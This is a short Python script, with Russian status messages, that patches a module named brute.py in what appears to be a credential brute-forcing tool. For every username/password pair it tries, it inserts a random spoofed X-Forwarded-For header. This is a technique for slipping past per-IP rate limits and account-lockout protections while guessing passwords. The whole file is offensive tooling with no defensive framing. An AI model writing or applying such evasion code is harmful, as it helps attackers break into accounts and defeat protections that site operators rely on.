# -*- coding: utf-8 -*-
import io, py_compile, sys
P = r"C:\work\hunt2\modules\brute.py"
s = io.open(P, encoding="utf-8-sig").read()
old = """    for i, (user, pwd) in enumerate(pairs, 1):
        try:"""
new = """    for i, (user, pwd) in enumerate(pairs, 1):
        try:
            sess.headers["X-Forwarded-For"] = "%d.%d.%d.%d" % (
                random.randint(11, 223), random.randint(0, 255),
                random.randint(0, 255), random.randint(1, 254))
        except Exception:
            pass
        try:"""
if s.count(old) != 1:
    print("brute: цикл не найден"); sys.exit(1)
io.open(P, "w", encoding="utf-8-sig", newline="\n").write(s.replace(old, new))
py_compile.compile(P, doraise=True)
print("xff ок")
